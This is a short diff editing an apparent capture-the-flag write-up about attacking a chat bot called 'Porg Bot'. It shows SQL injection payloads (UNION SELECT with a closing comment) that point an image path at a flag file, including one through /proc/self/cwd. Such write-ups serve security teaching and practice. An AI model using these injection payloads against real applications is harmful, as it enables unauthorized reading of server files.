@@ -4,7 +4,7 @@
 
 So we can modify `porg.image` to any path.
 
-I first tried `@Porg Bot porg %' union select 1,1,1,1,'/srv/flag.txt';/*` but there was no response.
+I first tried `@Porg Bot porg %' union select 1,1,1,1,'/srv/src/flag.txt';/*` but there was no response.
 
 `@Porg Bot porg %' union select 1,1,1,1,'/proc/self/cwd/flag.txt';/*` worked, but I couldn't see any image.
 
